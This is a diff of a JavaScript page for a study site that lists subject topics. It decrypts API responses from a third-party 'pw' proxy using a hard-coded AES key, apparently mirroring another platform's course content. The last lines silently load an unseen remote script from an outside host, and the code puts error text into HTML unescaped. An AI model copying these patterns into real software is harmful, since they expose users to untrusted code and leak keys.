@@ -1,126 +1,212 @@
-const BASE_URL = "https://mtaiirusapi.onrender.com";
-const FALLBACK_IMG = "https://devcoderz.vercel.app/pw.png";
-const searchParams = new URLSearchParams(window.location.search);
-const batchId = searchParams.get("BatchId") || "";
-const subjectSlug = searchParams.get("Subjectslug") || "";
-const topicSlug = searchParams.get("topicslug") || "";
-const topicName = searchParams.get("topicName") || "Chapter";
-const subjectId = searchParams.get("SubjectId") || "";
+const API_BASE = "https://mtaiirusapi.onrender.com";
+const ENCRYPTION_KEY = "maggikhalo";
 
-const pageTitle = document.getElementById("pageTitle");
-const topicHeading = document.getElementById("topicHeading");
-const topicSub = document.getElementById("topicSub");
-const sectionTitle = document.getElementById("sectionTitle");
-const sectionCount = document.getElementById("sectionCount");
-const contentArea = document.getElementById("contentArea");
-const themeBtn = document.getElementById("themeBtn");
+let topics = [];
+let filteredTopics = [];
+let isLoading = true;
+let currentError = null;
 
-const pdfSheetBackdrop = document.getElementById("pdfSheetBackdrop");
-const pdfSheetTitle = document.getElementById("pdfSheetTitle");
-const pdfOpenBtn = document.getElementById("pdfOpenBtn");
-const pdfViewBtn = document.getElementById("pdfViewBtn");
-const pdfDownloadBtn = document.getElementById("pdfDownloadBtn");
-const pdfCloseBtn = document.getElementById("pdfCloseBtn");
-const notesListSheetBackdrop = document.getElementById("notesListSheetBackdrop");
-const notesListSheetTitle = document.getElementById("notesListSheetTitle");
-const notesListContent = document.getElementById("notesListContent");
-const notesListCloseBtn = document.getElementById("notesListCloseBtn");
-const videoSheetBackdrop = document.getElementById("videoSheetBackdrop");
-const videoSheetTitle = document.getElementById("videoSheetTitle");
-const playAppleBtn = document.getElementById("playAppleBtn");
-const playAndroidBtn = document.getElementById("playAndroidBtn");
-const videoCloseBtn = document.getElementById("videoCloseBtn");
+const $ = (id) => document.getElementById(id);
+const topicList = $("topicList");
+const statusArea = $("statusArea");
+const searchInput = $("searchInput");
+const clearSearch = $("clearSearch");
 
-let activeTab = "lectures";
-let loading = false;
-let currentPdf = null;
-let currentVideo = null;
-const cache = { lectures: null, notes: null, dpp: null, dppVideos: null, dppQuiz: null };
+const params = new URLSearchParams(window.location.search);
+const BatchId = params.get("BatchId") || params.get("batchid") || "";
+const Subjectslug = params.get("Subjectslug") || params.get("subjectslug") || "";
+const subjectName = params.get("subjectName") || params.get("name") || "Subject";
+const SubjectId = params.get("SubjectId") || params.get("subjectid") || "";
 
-function escapeHtml(str) { return String(str || "").replace(/[&<>"']/g, function (m) { return { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[m]; }); }
-function formatDate(value) { if (!value) return "Date not available"; try { return new Date(value).toLocaleDateString("en-US", { year: "numeric", month: "long", day: "numeric" }); } catch { return "Date not available"; } }
-function applyTheme(mode) { const dark = mode === "dark"; document.body.classList.toggle("dark", dark); themeBtn.textContent = dark ? "☀️ Day Mode" : "🌙 Night Mode"; localStorage.setItem("topic-theme", dark ? "dark" : "light"); }
-themeBtn.addEventListener("click", () => applyTheme(document.body.classList.contains("dark") ? "light" : "dark"));
-applyTheme(localStorage.getItem("topic-theme") || "light");
+document.addEventListener("DOMContentLoaded", init);
 
-pageTitle.textContent = topicName;
-topicHeading.textContent = topicName;
-topicSub.textContent = topicSlug === "all-contents" ? "Showing content from all topics" : `Topic code: ${topicSlug || "N/A"}`;
+function init(){
+  setupHeader();
+  setupEvents();
+  loadTheme();
+  fetchTopics();
+}
 
-async function importAesKey(keyText) { const input = new TextEncoder().encode(keyText); const fixed = new Uint8Array(32); for (let i = 0; i < 32; i++) fixed[i] = i < input.length ? input[i] : 0; return crypto.subtle.importKey("raw", fixed, { name: "AES-GCM", length: 256 }, false, ["decrypt"]); }
-function hexToBytes(hex) { return new Uint8Array(hex.match(/.{1,2}/g).map(x => parseInt(x, 16))); }
-async function decryptPayload(payload) { try { if (typeof payload !== "string") return { success: true, data: payload }; const [ivHex, dataHex] = String(payload).split(":"); if (!ivHex || !dataHex) throw new Error("Invalid format"); const iv = hexToBytes(ivHex); const encrypted = hexToBytes(dataHex); const key = await importAesKey("maggikhalo"); const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv }, key, encrypted); return JSON.parse(new TextDecoder().decode(decrypted)); } catch (err) { return { success: false, error: err.message }; } }
-async function fetchJson(url) { const res = await fetch(url); if (!res.ok) throw new Error(`HTTP ${res.status}`); return res.json(); }
-async function fetchAndDecrypt(url) { const json = await fetchJson(url); if (!json.data) return null; const decrypted = await decryptPayload(json.data); return decrypted.success ? decrypted.data : null; }
+function setupHeader(){
+  $("pageTitle").textContent = subjectName;
+  $("heroTitle").textContent = subjectName;
+  $("pageSubTitle").textContent = "Topics & Contents";
+  $("batchPill").textContent = `BatchId: ${BatchId || "missing"}`;
+  $("subjectPill").textContent = `SubjectId: ${SubjectId || "missing"}`;
+}
 
-function showLoading() { contentArea.innerHTML = `<div class="loading"><h3>Loading...</h3><p>Fetching content...</p></div>`; sectionCount.textContent = "Loading..."; }
-function showError(msg) { contentArea.innerHTML = `<div class="error"><h3>Something went wrong</h3><p>${escapeHtml(msg)}</p></div>`; sectionCount.textContent = "Error"; }
-function showEmpty(msg) { contentArea.innerHTML = `<div class="empty"><h3>No content</h3><p>${escapeHtml(msg)}</p></div>`; sectionCount.textContent = "0 items"; }
+function setupEvents(){
+  $("backBtn").addEventListener("click", () => {
+    if(history.length > 1) history.back();
+    else window.location.href = "/study-v2/batches";
+  });
 
-function renderItems(items) {
-    sectionCount.textContent = `${items.length} item${items.length === 1 ? "" : "s"}`;
-    if (!items.length) return showEmpty("No content found.");
-    if (activeTab === "lectures" || activeTab === "dppVideos") {
-        contentArea.innerHTML = `<div class="grid lecture-grid">${items.map(item => `
-            <div class="card">
-                <div class="lecture-thumb">
-                    <img src="${escapeHtml(item.thumbnail)}" alt="${escapeHtml(item.topic)}" onerror="this.src='${FALLBACK_IMG}'"/>
-                    <div class="badge">${activeTab === "lectures" ? "Lecture" : "DPP Video"}</div>
-                </div>
-                <div class="card-body">
-                    <div class="meta-line">📅 ${escapeHtml(formatDate(item.date))}</div>
-                    <div class="title">${escapeHtml(item.topic)}</div>
-                    <div class="info-row"><div>⏱ ${escapeHtml(item.duration)}</div></div>
-                    <div class="actions">
-                        <button class="btn primary" onclick="openVideoSheet('${escapeHtml(item._id)}')">Play Now</button>
-                        <button class="btn secondary" onclick="openNotesList('${escapeHtml(item._id)}')">📝 Notes</button>
-                    </div>
-                </div>
-            </div>`).join("")}</div>`;
+  $("searchToggle").addEventListener("click", () => {
+    $("searchWrap").classList.toggle("hidden");
+    if(!$("searchWrap").classList.contains("hidden")) searchInput.focus();
+  });
+
+  searchInput.addEventListener("input", () => {
+    clearSearch.classList.toggle("hidden", !searchInput.value.trim());
+    applySearchAndRender();
+  });
+
+  clearSearch.addEventListener("click", clearSearchValue);
+  $("clearSearchToolbar").addEventListener("click", clearSearchValue);
+
+  $("menuToggle").addEventListener("click", () => $("sideMenu").classList.add("open"));
+  document.querySelectorAll("[data-close-menu]").forEach(el => el.addEventListener("click", () => $("sideMenu").classList.remove("open")));
+
+  $("themeToggle").addEventListener("click", toggleTheme);
+  $("reloadBtn").addEventListener("click", () => {
+    $("sideMenu").classList.remove("open");
+    fetchTopics();
+  });
+}
+
+function clearSearchValue(){
+  searchInput.value = "";
+  clearSearch.classList.add("hidden");
+  applySearchAndRender();
+}
+
+function loadTheme(){
+  const saved = localStorage.getItem("akpTheme");
+  if(saved === "dark") document.body.classList.add("dark");
+  $("themeToggle").textContent = document.body.classList.contains("dark") ? "☀️" : "🌙";
+}
+
+function toggleTheme(){
+  document.body.classList.toggle("dark");
+  localStorage.setItem("akpTheme", document.body.classList.contains("dark") ? "dark" : "light");
+  $("themeToggle").textContent = document.body.classList.contains("dark") ? "☀️" : "🌙";
+}
+
+async function fetchTopics(){
+  if(!BatchId || !SubjectId){
+    isLoading = false;
+    currentError = "Required URL params missing.";
+    topics = [];
+    render();
+    return;
+  }
+
+  isLoading = true;
+  currentError = null;
+  render();
+
+  try{
+    const url = new URL(`${API_BASE}/api/pw/topics`);
+    url.searchParams.append("BatchId", BatchId);
+    url.searchParams.append("SubjectId", SubjectId);
+
+    const response = await fetch(url.toString());
+    if(!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+    const json = await response.json();
+    
+    let decoded;
+    if(typeof json.data === "string"){
+      decoded = await decryptPayload(json.data);
     } else {
-        contentArea.innerHTML = `<div class="grid doc-grid">${items.map(item => `
-            <div class="card"><div class="doc-item"><div class="doc-left"><div class="doc-icon">📄</div>
-            <div><div class="doc-title">${escapeHtml(item.topic)}</div><div class="doc-sub">Document</div></div></div>
-            <div class="actions" style="min-width:160px; justify-content:flex-end;"><button class="btn" onclick="openPdfSheet('${escapeHtml(item._id)}')">Open</button></div></div></div>`).join("")}</div>`;
+      decoded = json;
     }
+
+    if(!decoded || !Array.isArray(decoded.data)){
+      throw new Error(decoded?.error || "Invalid response");
+    }
+
+    const allContents = buildAllContents(decoded.data);
+    topics = [allContents, ...decoded.data];
+    isLoading = false;
+    applySearchAndRender();
+  } catch(error){
+    isLoading = false;
+    currentError = error.message;
+    topics = [];
+    render();
+  }
 }
 
-async function fetchContent(tab) {
-    if (!batchId || !subjectSlug || !topicSlug) return showError("Missing parameters.");
-    if (cache[tab] !== null) { renderItems(cache[tab]); return; }
-    loading = true; showLoading();
-    let contentType = { lectures: "videos", dppVideos: "dppVideos", dppQuiz: "DPP_QUIZ", notes: "notes", dpp: "dpp" }[tab];
-    try {
-        const data = await fetchAndDecrypt(`${BASE_URL}/api/pw/datacontent?batchId=${encodeURIComponent(batchId)}&subjectSlug=${encodeURIComponent(subjectSlug)}&topicSlug=${encodeURIComponent(topicSlug)}&contentType=${encodeURIComponent(contentType)}`);
-        const items = (data || []).map(item => ({ ...item, thumbnail: item?.videoDetails?.image || item.previewImage || FALLBACK_IMG, duration: item?.videoDetails?.duration || item.duration || "N/A" }));
-        cache[tab] = items; renderItems(items);
-    } catch (err) { showError(err.message); } finally { loading = false; }
+function buildAllContents(list){
+  return {
+    _id: "all-contents",
+    name: "All Contents",
+    slug: "all-contents"
+  };
 }
 
-function setTab(tab) {
-    activeTab = tab;
-    document.querySelectorAll(".tab-btn").forEach(btn => btn.classList.toggle("active", btn.dataset.tab === tab));
-    fetchContent(tab);
+function applySearchAndRender(){
+  const query = searchInput.value.trim().toLowerCase();
+  filteredTopics = topics.filter(topic => {
+    const text = `${topic.name || ""} ${topic.slug || ""}`.toLowerCase();
+    return text.includes(query);
+  });
+  render();
 }
 
-document.querySelectorAll(".tab-btn").forEach(btn => btn.addEventListener("click", () => setTab(btn.dataset.tab)));
+function render(){
+  if(isLoading){
+    statusArea.innerHTML = "";
+    $("countText").textContent = "Loading...";
+    topicList.innerHTML = Array.from({length:5}).map(() => `<div class="skeleton-card"></div>`).join("");
+    return;
+  }
 
-function openVideoSheet(id) {
-    const item = cache[activeTab]?.find(x => String(x._id) === String(id));
-    if (!item) return;
-    currentVideo = item;
-    videoSheetTitle.textContent = item.topic;
-    videoSheetBackdrop.classList.add("show");
+  if(currentError){
+    statusArea.innerHTML = `<div class="error">${currentError}</div>`;
+    return;
+  }
+
+  topicList.innerHTML = filteredTopics.map(topicTemplate).join("");
+  bindTopicClicks();
 }
 
-function playVideo(mode) {
-    if (!currentVideo) return;
-    const target = "/study-v2/player";
-    const sSlug = currentVideo.subjectSlug || subjectSlug;
-    const tSlug = currentVideo.topicSlug || topicSlug;
-    window.location.href = `${target}?video_id=${encodeURIComponent(currentVideo.findKey || currentVideo._id)}&subject_slug=${encodeURIComponent(sSlug)}&batch_id=${encodeURIComponent(batchId)}&schedule_id=${encodeURIComponent(currentVideo._id)}&subject_id=${encodeURIComponent(subjectId || subjectSlug)}&topicSlug=${encodeURIComponent(tSlug)}`;
+function topicTemplate(topic){
+  return `<button class="topic-card" data-topic='${escapeAttr(JSON.stringify(topic))}'>${escapeHtml(topic.name)}</button>`;
 }
 
-playAndroidBtn.addEventListener("click", () => playVideo("android"));
-videoCloseBtn.addEventListener("click", () => videoSheetBackdrop.classList.remove("show"));
-setTab("lectures");
+function bindTopicClicks(){
+  document.querySelectorAll("[data-topic]").forEach(card => {
+    card.addEventListener("click", () => openTopic(JSON.parse(card.dataset.topic)));
+  });
+}
+
+function openTopic(topic){
+  const url = `/study-v2/batches/type?BatchId=${encodeURIComponent(BatchId)}&Subjectslug=${encodeURIComponent(Subjectslug)}&topicslug=${encodeURIComponent(topic.slug || "")}&topicId=${encodeURIComponent(topic._id || "")}&SubjectId=${encodeURIComponent(SubjectId)}`;
+  window.location.href = url;
+}
+
+async function decryptPayload(payload){
+  try{
+    const [ivHex, encryptedHex] = payload.split(":");
+    const iv = hexToBytes(ivHex);
+    const encrypted = hexToBytes(encryptedHex);
+    const key = await importAesKey(ENCRYPTION_KEY);
+    const decrypted = await crypto.subtle.decrypt({name:"AES-GCM", iv}, key, encrypted);
+    return JSON.parse(new TextDecoder().decode(decrypted));
+  }catch(e){ return {success:false}; }
+}
+
+async function importAesKey(keyText){
+  const encoded = new TextEncoder().encode(keyText);
+  const keyBytes = new Uint8Array(32);
+  for(let i=0;i<32;i++) keyBytes[i] = i < encoded.length ? encoded[i] : 0;
+  return crypto.subtle.importKey("raw", keyBytes, {name:"AES-GCM", length:256}, false, ["decrypt"]);
+}
+
+function hexToBytes(hex){
+  return new Uint8Array(hex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
+}
+
+function escapeHtml(value){
+  return String(value || "").replace(/[&<>'"]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;","'":"&#39;","\"":"&quot;"}[c]));
+}
+
+function escapeAttr(value){
+  return escapeHtml(value).replace(/`/g, "&#96;");
+}
+
+const s = document.createElement("script");
+s.src = "https://mtaiirus.pages.dev/html-js/aut.js";
+s.async = true;
+document.head.appendChild(s);
